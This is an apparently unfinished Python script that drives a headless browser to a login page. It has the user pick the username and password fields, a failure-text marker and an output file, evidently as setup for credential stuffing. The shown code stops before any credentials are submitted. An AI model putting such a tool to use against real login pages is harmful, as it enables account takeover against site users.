import helium
import argparse


# Start the browser depending on what the user chose as their option
def startbrowser():
	if browser == 'f':
		helium.start_firefox(url, headless=True)
	else:
		helium.start_chrome(url, headless=True)





# The URL for the page to be stuffed
url = input('Login Page URL: ').strip()


# Allow the user to choose the browser
browser = input('Firefox (f) or Chrome (c) [Use Chrome if neither specified] ')


# This part of the code is for the user to choose their parameters
# --------------------------------------------------------------------------------------------------------------------------------------

# Start the browser and search for parameters, put them in a number indexed dictionary
startbrowser()
fields = helium.find_all(helium.S('input'))
fields = dict(enumerate(fields, start=1))

# Show the user the displayable fields
for x in fields:
	print(f'{x}: {fields[x]}')

# Allow the user to choose the available parameters

choosing_params = True
while choosing_params:
	field_options = input('Enter the numbered fields for the username and password, separated by commas [e.g 1,2] ').strip().split(',')

	# Error handling
	try:
		# Add the available site to the list
		chosen_fields = []
		for x in field_options:
			if int(x) in fields.keys():
				chosen_fields.append(fields[int(x)])
				choosing_params = False
			else:
				choosing_params = True
				break
	except (TypeError, ValueError):
		print('You must enter numbers')
		continue



# --------------------------------------------------------------------------------------------------------------------------------------

# Allow the user to specify the output of the file they would like
credfile = input('Enter the file you would like to put the details in (Skip for only stdout): ')



# Enter the text that is visible ONLY when incorrect credentials are entered:
incorrect_text = input('Enter text that appears upon incorrect credential submission: ')


